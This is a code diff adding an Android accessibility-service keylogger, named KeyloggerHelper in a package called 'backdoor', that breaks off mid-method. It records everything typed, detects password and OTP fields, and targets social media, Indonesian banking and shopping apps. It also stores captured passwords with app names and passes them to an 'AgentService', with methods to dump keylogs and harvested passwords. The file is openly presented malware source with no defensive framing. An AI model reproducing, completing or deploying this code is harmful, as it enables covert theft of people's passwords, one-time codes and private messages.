@@ -1,0 +1,1053 @@
+package com.lazyframework.backdoor;
+
+import android.accessibilityservice.AccessibilityService;
+import android.accessibilityservice.AccessibilityServiceInfo;
+import android.content.Context;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
+import android.os.Build;
+import android.os.Handler;
+import android.os.Looper;
+import android.util.Log;
+import android.view.KeyEvent;
+import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
+import android.text.TextUtils;
+
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.atomic.AtomicBoolean;
+
+public class KeyloggerHelper extends AccessibilityService {
+    private static final String TAG = "LazyFramework";
+    
+    // ==================== STATIC REFERENCES ====================
+    private static AgentService agentService;
+    private static KeyloggerHelper instance;
+    private static boolean isServiceRunning = false;
+    
+    // ==================== KEYLOGGING STATE ====================
+    private AtomicBoolean isKeyloggingEnabled = new AtomicBoolean(false);
+    private StringBuilder currentWord = new StringBuilder();
+    private String lastPackageName = "";
+    private String lastClassName = "";
+    private long lastKeyTime = 0;
+    private int lastKeyCode = -1;
+    private boolean isShiftPressed = false;
+    private boolean isCapsLockOn = false;
+    private boolean isCtrlPressed = false;
+    private boolean isAltPressed = false;
+    private boolean isMetaPressed = false;
+    
+    // ==================== PASSWORD HARVESTING ====================
+    private boolean isPasswordField = false;
+    private StringBuilder passwordBuffer = new StringBuilder();
+    private String currentAppName = "";
+    private long lastPasswordInputTime = 0;
+    private static final long PASSWORD_TIMEOUT = 5000; // 5 detik tanpa input = selesai
+    
+    // Password detection keywords (multi-language)
+    private static final String[] PASSWORD_KEYWORDS = {
+        "password", "pass", "pwd", "sand", "kata sandi", "sandi",
+        "pin", "login", "log in", "sign in", "masuk", "kunci",
+        "verifikasi", "verification", "otp", "code", "kode",
+        "pw", "new password", "confirm", "konfirmasi",
+        "current password", "old password", "password lama"
+    };
+    
+    // Supported apps for password harvesting
+    private static final String[] SOCIAL_MEDIA_APPS = {
+        "com.facebook", "com.instagram", "com.whatsapp", "com.twitter", 
+        "com.tiktok", "com.snapchat", "com.linkedin", "com.pinterest",
+        "com.google.android.gm", "com.google.android.apps.maps",
+        "com.spotify", "com.netflix", "com.amazon",
+        "com.telegram", "com.signal", "com.discord",
+        "com.microsoft.skype", "com.zoom", "com.google.android.youtube",
+        "com.bank", "com.ocbc", "com.mandiri", "com.bca", "com.bni", "com.bri",
+        "com.shopee", "com.tokopedia", "com.bukalapak", "com.lazada"
+    };
+    
+    // ==================== BUFFER & CACHE ====================
+    private StringBuilder keyBuffer = new StringBuilder();
+    private static final int MAX_BUFFER_SIZE = 500000;
+    private StringBuilder fullLogBuffer = new StringBuilder();
+    private StringBuilder passwordLogBuffer = new StringBuilder();
+    private static final int MAX_LOG_SIZE = 1000000;
+    
+    // ==================== WORD COMPLETION ====================
+    private StringBuilder wordBuffer = new StringBuilder();
+    private long lastWordTime = 0;
+    private static final long WORD_TIMEOUT = 3000;
+    
+    // ==================== KEY MAPPING ====================
+    private static final ConcurrentHashMap<Integer, String> KEY_MAP = new ConcurrentHashMap<>();
+    private static final ConcurrentHashMap<Integer, String> SHIFT_KEY_MAP = new ConcurrentHashMap<>();
+    
+    static {
+        // ============ LETTERS ============
+        KEY_MAP.put(KeyEvent.KEYCODE_A, "a"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_A, "A");
+        KEY_MAP.put(KeyEvent.KEYCODE_B, "b"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_B, "B");
+        KEY_MAP.put(KeyEvent.KEYCODE_C, "c"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_C, "C");
+        KEY_MAP.put(KeyEvent.KEYCODE_D, "d"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_D, "D");
+        KEY_MAP.put(KeyEvent.KEYCODE_E, "e"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_E, "E");
+        KEY_MAP.put(KeyEvent.KEYCODE_F, "f"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_F, "F");
+        KEY_MAP.put(KeyEvent.KEYCODE_G, "g"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_G, "G");
+        KEY_MAP.put(KeyEvent.KEYCODE_H, "h"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_H, "H");
+        KEY_MAP.put(KeyEvent.KEYCODE_I, "i"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_I, "I");
+        KEY_MAP.put(KeyEvent.KEYCODE_J, "j"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_J, "J");
+        KEY_MAP.put(KeyEvent.KEYCODE_K, "k"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_K, "K");
+        KEY_MAP.put(KeyEvent.KEYCODE_L, "l"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_L, "L");
+        KEY_MAP.put(KeyEvent.KEYCODE_M, "m"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_M, "M");
+        KEY_MAP.put(KeyEvent.KEYCODE_N, "n"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_N, "N");
+        KEY_MAP.put(KeyEvent.KEYCODE_O, "o"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_O, "O");
+        KEY_MAP.put(KeyEvent.KEYCODE_P, "p"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_P, "P");
+        KEY_MAP.put(KeyEvent.KEYCODE_Q, "q"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_Q, "Q");
+        KEY_MAP.put(KeyEvent.KEYCODE_R, "r"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_R, "R");
+        KEY_MAP.put(KeyEvent.KEYCODE_S, "s"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_S, "S");
+        KEY_MAP.put(KeyEvent.KEYCODE_T, "t"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_T, "T");
+        KEY_MAP.put(KeyEvent.KEYCODE_U, "u"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_U, "U");
+        KEY_MAP.put(KeyEvent.KEYCODE_V, "v"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_V, "V");
+        KEY_MAP.put(KeyEvent.KEYCODE_W, "w"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_W, "W");
+        KEY_MAP.put(KeyEvent.KEYCODE_X, "x"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_X, "X");
+        KEY_MAP.put(KeyEvent.KEYCODE_Y, "y"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_Y, "Y");
+        KEY_MAP.put(KeyEvent.KEYCODE_Z, "z"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_Z, "Z");
+        
+        // ============ NUMBERS ============
+        KEY_MAP.put(KeyEvent.KEYCODE_0, "0"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_0, ")");
+        KEY_MAP.put(KeyEvent.KEYCODE_1, "1"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_1, "!");
+        KEY_MAP.put(KeyEvent.KEYCODE_2, "2"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_2, "@");
+        KEY_MAP.put(KeyEvent.KEYCODE_3, "3"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_3, "#");
+        KEY_MAP.put(KeyEvent.KEYCODE_4, "4"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_4, "$");
+        KEY_MAP.put(KeyEvent.KEYCODE_5, "5"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_5, "%");
+        KEY_MAP.put(KeyEvent.KEYCODE_6, "6"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_6, "^");
+        KEY_MAP.put(KeyEvent.KEYCODE_7, "7"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_7, "&");
+        KEY_MAP.put(KeyEvent.KEYCODE_8, "8"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_8, "*");
+        KEY_MAP.put(KeyEvent.KEYCODE_9, "9"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_9, "(");
+        
+        // ============ SYMBOLS ============
+        KEY_MAP.put(KeyEvent.KEYCODE_PERIOD, "."); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_PERIOD, ">");
+        KEY_MAP.put(KeyEvent.KEYCODE_COMMA, ","); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_COMMA, "<");
+        KEY_MAP.put(KeyEvent.KEYCODE_SLASH, "/"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_SLASH, "?");
+        KEY_MAP.put(KeyEvent.KEYCODE_BACKSLASH, "\\"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_BACKSLASH, "|");
+        KEY_MAP.put(KeyEvent.KEYCODE_GRAVE, "`"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_GRAVE, "~");
+        KEY_MAP.put(KeyEvent.KEYCODE_MINUS, "-"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_MINUS, "_");
+        KEY_MAP.put(KeyEvent.KEYCODE_EQUALS, "="); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_EQUALS, "+");
+        KEY_MAP.put(KeyEvent.KEYCODE_LEFT_BRACKET, "["); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_LEFT_BRACKET, "{");
+        KEY_MAP.put(KeyEvent.KEYCODE_RIGHT_BRACKET, "]"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_RIGHT_BRACKET, "}");
+        KEY_MAP.put(KeyEvent.KEYCODE_SEMICOLON, ";"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_SEMICOLON, ":");
+        KEY_MAP.put(KeyEvent.KEYCODE_APOSTROPHE, "'"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_APOSTROPHE, "\"");
+        KEY_MAP.put(KeyEvent.KEYCODE_SPACE, " "); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_SPACE, " ");
+    }
+
+    // ==================== SERVICE LIFECYCLE ====================
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        Log.d(TAG, "⌨️ KeyloggerHelper with Password Harvesting created");
+        instance = this;
+        isServiceRunning = true;
+        
+        configureService();
+        isKeyloggingEnabled.set(true);
+        
+        keyBuffer.setLength(0);
+        fullLogBuffer.setLength(0);
+        passwordLogBuffer.setLength(0);
+        passwordBuffer.setLength(0);
+        
+        Log.d(TAG, "✅ Password Harvester initialized");
+    }
+
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (!isKeyloggingEnabled.get()) {
+            return;
+        }
+
+        try {
+            int eventType = event.getEventType();
+            String packageName = event.getPackageName() != null ? 
+                event.getPackageName().toString() : "unknown";
+            
+            // Track app change
+            if (!packageName.equals(lastPackageName)) {
+                String oldApp = currentAppName;
+                currentAppName = getAppName(packageName);
+                lastPackageName = packageName;
+                
+                if (!oldApp.equals(currentAppName)) {
+                    Log.d(TAG, "📱 App changed: " + currentAppName + " (" + packageName + ")");
+                    
+                    // Check if this is a supported app
+                    if (isSupportedApp(packageName)) {
+                        Log.d(TAG, "✅ Supported app detected: " + currentAppName);
+                    }
+                }
+            }
+            
+            // ============ HANDLE TEXT CHANGED ============
+            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                handleTextChanged(event);
+            }
+            
+            // ============ HANDLE WINDOW STATE CHANGED ============
+            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                handleWindowChange(event);
+            }
+            
+            // ============ HANDLE VIEW CLICKED ============
+            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                handleViewClicked(event);
+            }
+            
+            // ============ HANDLE FOCUSED VIEW ============
+            if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
+                handleViewFocused(event);
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Accessibility event error: " + e.getMessage());
+        }
+    }
+
+    @Override
+    public void onInterrupt() {
+        Log.w(TAG, "⚠️ KeyloggerHelper interrupted");
+        isServiceRunning = false;
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        Log.d(TAG, "⌨️ KeyloggerHelper destroyed");
+        isServiceRunning = false;
+        instance = null;
+        isKeyloggingEnabled.set(false);
+    }
+
+    @Override
+    public void onServiceConnected() {
+        super.onServiceConnected();
+        Log.d(TAG, "✅ KeyloggerHelper service connected");
+        isServiceRunning = true;
+        isKeyloggingEnabled.set(true);
+        configureService();
+    }
+
+    // ==================== CONFIGURATION ====================
+
+    private void configureService() {
+        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
+        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
+        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
+        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
+                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
+                     AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE |
+                     AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            info.flags |= AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
+        }
+        
+        info.notificationTimeout = 50;
+        setServiceInfo(info);
+    }
+
+    // ==================== TEXT CHANGED HANDLER (PASSWORD DETECTION) ====================
+
+    private void handleTextChanged(AccessibilityEvent event) {
+        try {
+            if (event.getText() == null || event.getText().isEmpty()) return;
+            
+            CharSequence text = event.getText().get(0);
+            if (text == null || text.length() == 0) return;
+            
+            String newText = text.toString();
+            String packageName = event.getPackageName() != null ? 
+                event.getPackageName().toString() : "unknown";
+            String className = event.getClassName() != null ?
+                event.getClassName().toString() : "unknown";
+            
+            AccessibilityNodeInfo source = event.getSource();
+            boolean isPassword = false;
+            boolean isPasswordHint = false;
+            
+            if (source != null) {
+                // Check if this is a password field
+                isPassword = source.isPassword();
+                
+                // Check hint text for password keywords
+                CharSequence hint = source.getHintText();
+                if (hint != null) {
+                    String hintText = hint.toString().toLowerCase();
+                    for (String keyword : PASSWORD_KEYWORDS) {
+                        if (hintText.contains(keyword)) {
+                            isPasswordHint = true;
+                            break;
+                        }
+                    }
+                }
+                
+                // Also check if source is EditText with password input type
+                String classNameStr = source.getClassName() != null ? 
+                    source.getClassName().toString() : "";
+                if (classNameStr.contains("EditText") && 
+                    (isPassword || isPasswordHint || isPasswordField)) {
+                    isPasswordField = true;
+                }
+                
+                source.recycle();
+            }
+            
+            // ============ PASSWORD DETECTED! ============
+            if (isPassword || isPasswordHint || isPasswordField) {
+                isPasswordField = true;
+                
+                // Clean the text (remove asterisks if any)
+                String cleanText = newText.replaceAll("[*]", "");
+                
+                if (cleanText.length() > 0) {
+                    // Append to password buffer
+                    passwordBuffer.append(cleanText);
+                    lastPasswordInputTime = System.currentTimeMillis();
+                    
+                    Log.d(TAG, "🔐 Password input detected in " + currentAppName);
+                    
+                    // Check if password is complete (ENTER pressed or length > 8)
+                    if (cleanText.contains("\n") || 
+                        passwordBuffer.length() >= 8 || 
+                        (System.currentTimeMillis() - lastPasswordInputTime > PASSWORD_TIMEOUT)) {
+                        
+                        String password = passwordBuffer.toString().trim();
+                        if (password.length() >= 4) {
+                            // Password captured!
+                            logPassword(packageName, currentAppName, password);
+                            passwordBuffer.setLength(0);
+                            isPasswordField = false;
+                        }
+                    }
+                }
+            } else {
+                // Regular text input
+                String currentText = getTextFromSource(event);
+                String changedText = detectTextChange(currentText, newText, event);
+                
+                if (changedText != null && !changedText.isEmpty()) {
+                    logKey(packageName, className, changedText);
+                    
+                    if (agentService != null) {
+                        agentService.onKeyLogged(changedText);
+                    }
+                }
+            }
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Text changed error: " + e.getMessage());
+        }
+    }
+
+    // ==================== WINDOW CHANGE HANDLER ====================
+
+    private void handleWindowChange(AccessibilityEvent event) {
+        try {
+            String packageName = event.getPackageName() != null ?
+                event.getPackageName().toString() : "unknown";
+            String className = event.getClassName() != null ?
+                event.getClassName().toString() : "unknown";
+            
+            // Check for password fields in the new window
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root != null) {
+                findPasswordFields(root);
+                root.recycle();
+            }
+            
+            if (!packageName.equals(lastPackageName)) {
+                String logEntry = String.format(
+                    "\n=== [%s] WINDOW: %s (%s)\n",
+                    getCurrentTimestamp(),
+                    packageName,
+                    currentAppName
+                );
+                appendToBuffer(logEntry);
+                
+                lastPackageName = packageName;
+                lastClassName = className;
+                
+                Log.d(TAG, "🪟 Window: " + packageName + " (" + currentAppName + ")");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Window change error: " + e.getMessage());
+        }
+    }
+
+    // ==================== FIND PASSWORD FIELDS ====================
+
+    private void findPasswordFields(AccessibilityNodeInfo node) {
+        try {
+            if (node == null) return;
+            
+            // Check if this node is a password field
+            if (node.isPassword()) {
+                isPasswordField = true;
+                Log.d(TAG, "🔐 Password field detected in " + currentAppName);
+                
+                // Try to get existing text
+                CharSequence text = node.getText();
+                if (text != null && text.length() > 0) {
+                    String passwordText = text.toString().replaceAll("[*]", "");
+                    if (passwordText.length() > 0) {
+                        passwordBuffer.append(passwordText);
+                    }
+                }
+            }
+            
+            // Check for EditText with password hint
+            if (node.getClassName() != null && 
+                node.getClassName().toString().contains("EditText")) {
+                CharSequence hint = node.getHintText();
+                if (hint != null) {
+                    String hintText = hint.toString().toLowerCase();
+                    for (String keyword : PASSWORD_KEYWORDS) {
+                        if (hintText.contains(keyword)) {
+                            isPasswordField = true;
+                            Log.d(TAG, "🔐 Password hint detected: " + hintText);
+                            break;
+                        }
+                    }
+                }
+            }
+            
+            // Recurse children
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    findPasswordFields(child);
+                    child.recycle();
+                }
+            }
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Find password error: " + e.getMessage());
+        }
+    }
+
+    // ==================== OTHER EVENT HANDLERS ====================
+
+    private void handleViewClicked(AccessibilityEvent event) {
+        try {
+            AccessibilityNodeInfo source = event.getSource();
+            if (source != null) {
+                // Check if click is on a password field
+                if (source.isPassword()) {
+                    isPasswordField = true;
+                    passwordBuffer.setLength(0);
+                    Log.d(TAG, "🔐 Password field clicked in " + currentAppName);
+                }
+                source.recycle();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "View clicked error: " + e.getMessage());
+        }
+    }
+
+    private void handleViewFocused(AccessibilityEvent event) {
+        try {
+            AccessibilityNodeInfo source = event.getSource();
+            if (source != null) {
+                if (source.isPassword()) {
+                    isPasswordField = true;
+                    passwordBuffer.setLength(0);
+                    Log.d(TAG, "🔐 Password field focused in " + currentAppName);
+                }
+                source.recycle();
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+
+    // ==================== PASSWORD LOGGING ====================
+
+    private void logPassword(String packageName, String appName, String password) {
+        try {
+            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+                .format(new Date());
+
+            // Create password log entry
+            String logEntry = String.format(
+                "\n🔐 ===== PASSWORD CAPTURED =====\n" +
+                "  Time: %s\n" +
+                "  App: %s\n" +
+                "  Package: %s\n" +
+                "  Password: %s\n" +
+                "  Length: %d\n" +
+                "================================\n\n",
+                timestamp,
+                appName,
+                packageName,
+                password,
+                password.length()
+            );
+
+            // Log to buffers
+            appendToPasswordBuffer(logEntry);
+            appendToBuffer(logEntry);
+
+            // Send to agent service immediately
+            if (agentService != null) {
+                // Call the password capture method in AgentService
+                // We'll add this method
+                agentService.onPasswordCaptured(packageName, appName, password);
+            }
+
+            Log.d(TAG, "🔐 Password captured: " + appName + " (" + password.length() + " chars)");
+
+        } catch (Exception e) {
+            Log.e(TAG, "Log password error: " + e.getMessage());
+        }
+    }
+
+    // ==================== HELPER METHODS ====================
+
+    private String getTextFromSource(AccessibilityEvent event) {
+        try {
+            AccessibilityNodeInfo source = event.getSource();
+            if (source != null) {
+                CharSequence text = source.getText();
+                if (text != null) {
+                    return text.toString();
+                }
+                source.recycle();
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
+        return "";
+    }
+
+    private String detectTextChange(String oldText, String newText, AccessibilityEvent event) {
+        try {
+            if (oldText == null) oldText = "";
+            if (newText == null) newText = "";
+            
+            if (oldText.equals(newText)) {
+                return null;
+            }
+            
+            // Check if text was deleted
+            if (newText.length() < oldText.length()) {
+                int minLen = Math.min(oldText.length(), newText.length());
+                int diffIndex = 0;
+                for (int i = 0; i < minLen; i++) {
+                    if (oldText.charAt(i) != newText.charAt(i)) {
+                        diffIndex = i;
+                        break;
+                    }
+                    diffIndex = i + 1;
+                }
+                
+                if (diffIndex < oldText.length()) {
+                    String deleted = oldText.substring(diffIndex);
+                    if (deleted.length() <= 10) {
+                        return "[DEL] " + deleted;
+                    } else {
+                        return "[DEL] (multiple characters)";
+                    }
+                }
+                return null;
+            }
+            
+            // Check if text was added
+            if (newText.length() > oldText.length()) {
+                int minLen = Math.min(oldText.length(), newText.length());
+                int diffIndex = 0;
+                for (int i = 0; i < minLen; i++) {
+                    if (oldText.charAt(i) != newText.charAt(i)) {
+                        diffIndex = i;
+                        break;
+                    }
+                    diffIndex = i + 1;
+                }
+                
+                if (diffIndex < newText.length()) {
+                    String added = newText.substring(diffIndex);
+                    
+                    // Check if it's a password field
+                    if (event != null && event.getSource() != null) {
+                        AccessibilityNodeInfo source = event.getSource();
+                        if (source != null) {
+                            boolean isPassword = source.isPassword();
+                            source.recycle();
+                            if (isPassword && added.length() > 0) {
+                                return "[PASSWORD] " + "*".repeat(added.length());
+                            }
+                        }
+                    }
+                    return added;
+                }
+                return null;
+            }
+            
+            // Same length, content changed
+            if (oldText.length() == newText.length()) {
+                String changed = "";
+                for (int i = 0; i < oldText.length(); i++) {
+                    if (oldText.charAt(i) != newText.charAt(i)) {
+                        changed += newText.charAt(i);
+                    }
+                }
+                if (!changed.isEmpty()) {
+                    return "[REPLACE] " + changed;
+                }
+            }
+            
+            return null;
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Detect change error: " + e.getMessage());
+            return null;
+        }
+    }
+
+    private void logKey(String packageName, String className, String keyText) {
+        try {
+            if (keyText == null || keyText.isEmpty()) {
+                return;
+            }
+            
+            String timestamp = getCurrentTimestamp();
+            
+            String logEntry = String.format(
+                "[%s] %s (%s): %s\n",
+                timestamp,
+                packageName,
+                className,
+                keyText
+            );
+            
+            appendToBuffer(logEntry);
+            updateWordBuffer(keyText);
+            
+            String debugText = keyText.length() > 50 ? 
+                keyText.substring(0, 50) + "..." : keyText;
+            Log.d(TAG, "⌨️ Key: " + debugText);
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Log key error: " + e.getMessage());
+        }
+    }
+
+    private void updateWordBuffer(String text) {
+        try {
+            if (text == null || text.isEmpty()) return;
+            
+            char[] chars = text.toCharArray();
+            for (char c : chars) {
+                if (Character.isLetterOrDigit(c)) {
+                    wordBuffer.append(c);
+                } else if (c == ' ') {
+                    if (wordBuffer.length() > 0) {
+                        wordBuffer.setLength(0);
+                    }
+                } else {
+                    if (wordBuffer.length() > 0 && !Character.isLetterOrDigit(c)) {
+                        wordBuffer.setLength(0);
+                    }
+                    if (c == '\n') {
+                        if (wordBuffer.length() > 0) {
+                            wordBuffer.setLength(0);
+                        }
+                    }
+                }
+            }
+            
+            if (wordBuffer.length() > 100) {
+                wordBuffer.setLength(0);
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+
+    private synchronized void appendToBuffer(String text) {
+        try {
+            fullLogBuffer.append(text);
+            keyBuffer.append(text);
+            
+            if (fullLogBuffer.length() > MAX_LOG_SIZE) {
+                int cutIndex = fullLogBuffer.indexOf("\n", fullLogBuffer.length() / 2);
+                if (cutIndex > 0) {
+                    fullLogBuffer.delete(0, cutIndex + 1);
+                } else {
+                    fullLogBuffer.setLength(0);
+                }
+            }
+            
+            if (keyBuffer.length() > MAX_BUFFER_SIZE) {
+                int cutIndex = keyBuffer.indexOf("\n", keyBuffer.length() / 2);
+                if (cutIndex > 0) {
+                    keyBuffer.delete(0, cutIndex + 1);
+                } else {
+                    keyBuffer.setLength(0);
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Buffer append error: " + e.getMessage());
+        }
+    }
+
+    private synchronized void appendToPasswordBuffer(String text) {
+        try {
+            passwordLogBuffer.append(text);
+            if (passwordLogBuffer.length() > MAX_LOG_SIZE) {
+                passwordLogBuffer.setLength(0);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Password buffer error: " + e.getMessage());
+        }
+    }
+
+    private String getCurrentTimestamp() {
+        return new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
+    }
+
+    private String getFullTimestamp() {
+        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
+    }
+
+    private String getAppName(String packageName) {
+        try {
+            PackageManager pm = getPackageManager();
+            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
+            return pm.getApplicationLabel(ai).toString();
+        } catch (Exception e) {
+            return packageName;
+        }
+    }
+
+    private boolean isSupportedApp(String packageName) {
+        for (String app : SOCIAL_MEDIA_APPS) {
+            if (packageName.contains(app)) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private String formatSize(long size) {
+        if (size <= 0) return "0 B";
+        String[] units = {"B", "KB", "MB", "GB"};
+        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
+        return String.format("%.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
+    }
+
+    // ==================== PUBLIC METHODS FOR AGENT ====================
+
+    public static void setAgentService(AgentService service) {
+        agentService = service;
+        Log.d(TAG, "📡 AgentService connected to KeyloggerHelper");
+    }
+
+    public static KeyloggerHelper getInstance() {
+        return instance;
+    }
+
+    public static boolean isRunning() {
+        return isServiceRunning && instance != null;
+    }
+
+    public void startKeylogging() {
+        isKeyloggingEnabled.set(true);
+        String logEntry = String.format(
+            "\n=== KEYLOGGER STARTED AT %s ===\n",
+            getFullTimestamp()
+        );
+        appendToBuffer(logEntry);
+        Log.d(TAG, "✅ Keylogging started");
+    }
+
+    public void stopKeylogging() {
+        isKeyloggingEnabled.set(false);
+        String logEntry = String.format(
+            "\n=== KEYLOGGER STOPPED AT %s ===\n",
+            getFullTimestamp()
+        );
+        appendToBuffer(logEntry);
+        Log.d(TAG, "⏹️ Keylogging stopped");
+    }
+
+    public boolean isKeyloggingEnabled() {
+        return isKeyloggingEnabled.get();
+    }
+
+    // ==================== DUMP METHODS ====================
+
+    public String dumpKeylogs() {
+        try {
+            String logs;
+            synchronized (this) {
+                logs = fullLogBuffer.toString();
+                fullLogBuffer.setLength(0);
+                fullLogBuffer.append("=== NEW SESSION STARTED AT ")
+                    .append(getFullTimestamp())
+                    .append(" ===\n");
+                keyBuffer.setLength(0);
+            }
+            
+            String header = String.format(
+                "=== KEYLOG DUMP ===\n" +
+                "Time: %s\n" +
+                "Total: %d characters\n" +
+                "===================\n\n",
+                getFullTimestamp(),
+                logs.length()
+            );
+            
+            return header + logs;
+        } catch (Exception e) {
+            Log.e(TAG, "Dump error: " + e.getMessage());
+            return "Error dumping keylogs: " + e.getMessage();
+        }
+    }
+
+    public String dumpPasswords() {
+        try {
+            String passwords;
+            synchronized (this) {
+                passwords = passwordLogBuffer.toString();
+                passwordLogBuffer.setLength(0);
+                passwordLogBuffer.append("=== NEW PASSWORD SESSION AT ")
+                    .append(getFullTimestamp())
+                    .append(" ===\n");
+            }
+            
+            if (passwords.isEmpty()) {
+                return "No passwords captured yet.";
+            }
+            
+            return passwords;
+        } catch (Exception e) {
+            return "Error: " + e.getMessage();
+        }
+    }
+
+    public String dumpBuffer() {
+        try {
+            String logs;
+            synchronized (this) {
+                logs = keyBuffer.toString();
+                keyBuffer.setLength(0);
+            }
+            return logs;
+        } catch (Exception e) {
+            return "Error: " + e.getMessage();
+        }
+    }
+
+    public String getStats() {
+        try {
+            synchronized (this) {
+                int totalKeys = fullLogBuffer.toString().split("\n").length;
+                int totalPasswords = passwordLogBuffer.toString().split("====").length - 1;
+                int bufferSize = fullLogBuffer.length();
+                int keyBufferSize = keyBuffer.length();
+                int passwordBufferSize = passwordLogBuffer.length();
+                
+                return String.format(
+                    "Password Harvester Statistics:\n" +
+                    "  Running: %s\n" +
+                    "  Total Keys: %d\n" +
+                    "  Total Passwords: %d\n" +
+                    "  Log Size: %d bytes (%s)\n" +
+                    "  Password Log Size: %d bytes (%s)\n" +
+                    "  Buffer Size: %d bytes (%s)\n" +
+                    "  Current App: %s\n" +
+                    "  Password Field Active: %s\n" +
+                    "  Time: %s",
+                    isKeyloggingEnabled.get() ? "✅ Yes" : "❌ No",
+                    totalKeys,
+                    totalPasswords,
+                    bufferSize, formatSize(bufferSize),
+                    passwordBufferSize, formatSize(passwordBufferSize),
+                    keyBufferSize, formatSize(keyBufferSize),
+                    currentAppName,
+                    isPasswordField ? "✅ Yes" : "❌ No",
+                    getFullTimestamp()
+                );
+            }
+        } catch (Exception e) {
+            return "Error getting stats: " + e.getMessage();
+        }
+    }
+
+    public void clearLogs() {
+        synchronized (this) {
+            fullLogBuffer.setLength(0);
+            keyBuffer.setLength(0);
+            passwordLogBuffer.setLength(0);
+            passwordBuffer.setLength(0);
+            isPasswordField = false;
+            fullLogBuffer.append("=== LOGS CLEARED AT ")
